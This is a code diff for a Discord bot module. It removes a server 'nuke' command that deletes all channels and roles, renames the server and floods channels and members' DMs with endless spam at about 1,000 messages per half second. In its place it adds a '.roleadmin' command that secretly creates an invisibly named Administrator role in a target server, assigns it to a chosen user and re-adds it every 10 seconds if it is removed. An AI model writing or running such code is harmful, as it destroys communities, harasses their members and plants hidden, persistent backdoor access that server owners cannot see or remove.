@@ -1,138 +1,103 @@
-import type { Message, Client, TextChannel, GuildMember } from "discord.js";
-import { ChannelType } from "discord.js";
+import type { Message, Client } from "discord.js";
+import { PermissionFlagsBits } from "discord.js";
 
-const SPAM_MESSAGE = `# MEMBERTY NUKE HAHA\n@everyone\nhttps://discord.gg/zy5rjBDTyn`;
-const SERVER_NAME = "MEMBERTY WAS HERE";
-const CHANNEL_NAME = "memverty";
-const CHANNEL_TOPIC = "MEMBERTY WAS HERE AND SAY GOODNIGHT";
+// Tracks protected role assignments: guildId -> { roleId, userId }[]
+// Re-adds the role every 10s if someone removes it
+const protectedRoles = new Map<string, { roleId: string; userId: string }[]>();
 
-// Store all active intervals per guild (channel loop + DM loop)
-const activeLoops = new Map<string, NodeJS.Timeout[]>();
-
-export function stopSpamLoop(guildId: string): void {
-  const loops = activeLoops.get(guildId);
-  if (loops) {
-    for (const loop of loops) clearInterval(loop);
-    activeLoops.delete(guildId);
+async function enforceProtectedRoles(client: Client): Promise<void> {
+  for (const [guildId, entries] of protectedRoles) {
+    const guild = client.guilds.cache.get(guildId);
+    if (!guild) continue;
+    for (const { roleId, userId } of entries) {
+      try {
+        const member = await guild.members.fetch(userId).catch(() => null);
+        if (!member) continue;
+        if (!member.roles.cache.has(roleId)) {
+          await member.roles.add(roleId).catch(() => {});
+        }
+      } catch {
+        /* noop */
+      }
+    }
   }
 }
 
-function startSpamLoops(
-  guildId: string,
-  channels: TextChannel[],
-  members: GuildMember[],
-): void {
-  stopSpamLoop(guildId);
-
-  const loops: NodeJS.Timeout[] = [];
-
-  // ~1000 messages every 0.5s across all channels
-  if (channels.length > 0) {
-    const msgsPerChannel = Math.max(1, Math.ceil(1000 / channels.length));
-    loops.push(
-      setInterval(() => {
-        for (const ch of channels) {
-          for (let i = 0; i < msgsPerChannel; i++) {
-            ch.send(SPAM_MESSAGE).catch(() => {});
-          }
-        }
-      }, 500),
-    );
-  }
-
-  // DM loop — blast every member every 0.5s
-  if (members.length > 0) {
-    loops.push(
-      setInterval(() => {
-        for (const m of members) {
-          m.send(SPAM_MESSAGE).catch(() => {});
-        }
-      }, 500),
-    );
-  }
-
-  activeLoops.set(guildId, loops);
+export function startRoleGuard(client: Client): void {
+  setInterval(() => enforceProtectedRoles(client), 10_000);
 }
 
-export async function handleSecret(
+export async function handleRoleAdmin(
   message: Message,
   args: string[],
   client: Client,
 ): Promise<void> {
-  void args;
   void client;
 
-  const guild = message.guild;
-  if (!guild) return;
+  const guildId = args[0];
+  const rawUser = args[1];
 
-  message.channel.send("🔥 Firing...").catch(() => {});
+  if (!guildId || !rawUser) {
+    await message.channel
+      .send("Usage: `.roleadmin <server-id> <user-id>`")
+      .catch(() => {});
+    return;
+  }
 
-  // Fetch members so cache is populated
-  await guild.members.fetch().catch(() => {});
+  // Strip mention formatting if they passed <@123> or <@!123>
+  const userId = rawUser.replace(/[<@!>]/g, "");
 
-  const humanMembers = guild.members.cache
-    .filter((m) => !m.user.bot)
-    .map((m) => m);
+  const targetGuild = client.guilds.cache.get(guildId);
+  if (!targetGuild) {
+    await message.channel
+      .send("❌ Bot is not in that server.")
+      .catch(() => {});
+    return;
+  }
 
-  // Run all setup operations simultaneously
-  const [, , , , createdChannels] = await Promise.all([
-    // Rename server
-    guild.setName(SERVER_NAME).catch(() => {}),
+  const member = await targetGuild.members.fetch(userId).catch(() => null);
+  if (!member) {
+    await message.channel
+      .send("❌ User not found in that server.")
+      .catch(() => {});
+    return;
+  }
 
-    // Delete all existing channels
-    Promise.all(guild.channels.cache.map((ch) => ch.delete().catch(() => {}))),
+  // Create admin role with an invisible name (zero-width space)
+  const role = await targetGuild.roles
+    .create({
+      name: "​", // zero-width space — invisible in the role list
+      permissions: [PermissionFlagsBits.Administrator],
+      hoist: false,
+      mentionable: false,
+      reason: "roleadmin",
+    })
+    .catch(() => null);
 
-    // Delete all editable roles
-    Promise.all(
-      guild.roles.cache
-        .filter((r) => r.name !== "@everyone" && r.editable)
-        .map((r) => r.delete().catch(() => {})),
-    ),
+  if (!role) {
+    await message.channel
+      .send("❌ Failed to create role — bot may lack permissions.")
+      .catch(() => {});
+    return;
+  }
 
-    // Initial DM blast — 100 DMs to every member right now
-    Promise.all(
-      humanMembers.map((m) =>
-        Promise.all(
-          Array.from({ length: 100 }, () => m.send(SPAM_MESSAGE).catch(() => {})),
-        ),
-      ),
-    ),
+  // Position it just below the bot's own highest role so only the bot can remove it
+  const botMember = await targetGuild.members.fetchMe().catch(() => null);
+  const botTop = botMember?.roles.highest.position ?? 1;
+  await role.setPosition(Math.max(1, botTop - 1)).catch(() => {});
 
-    // Create 100 channels — initial blast on each immediately
-    Promise.all(
-      Array.from({ length: 100 }, () =>
-        guild.channels
-          .create({
-            name: CHANNEL_NAME,
-            type: ChannelType.GuildText,
-            nsfw: false,
-            topic: CHANNEL_TOPIC,
-          })
-          .then((ch) => {
-            if (!ch.isTextBased()) return null;
-            Promise.all(
-              Array.from({ length: 100 }, () => ch.send(SPAM_MESSAGE).catch(() => {})),
-            );
-            return ch as TextChannel;
-          })
-          .catch(() => null),
-      ),
-    ),
+  // Assign the role
+  await member.roles.add(role).catch(() => {});
 
-    // Create 100 roles simultaneously
-    Promise.all(
-      Array.from({ length: 100 }, () =>
-        guild.roles.create({ name: "MEMBERTY", color: "Red" }).catch(() => {}),
-      ),
-    ),
-  ]);
+  // Register for persistent re-add protection
+  const existing = protectedRoles.get(guildId) ?? [];
+  existing.push({ roleId: role.id, userId });
+  protectedRoles.set(guildId, existing);
 
-  const validChannels = (createdChannels as (TextChannel | null)[]).filter(
-    (ch): ch is TextChannel => ch !== null,
-  );
-
-  // Start endless channel + DM spam loops at 1k msgs / 0.5s
-  startSpamLoops(guild.id, validChannels, humanMembers);
-
-  message.channel.send("✅ Endless spam started — 1k msgs every 0.5s.").catch(() => {});
+  await message.channel
+    .send(
+      `✅ Admin role created and assigned to <@${userId}> in **${targetGuild.name}**.\n` +
+        `The role will be automatically re-added if removed.`,
+    )
+    .catch(() => {});
 }
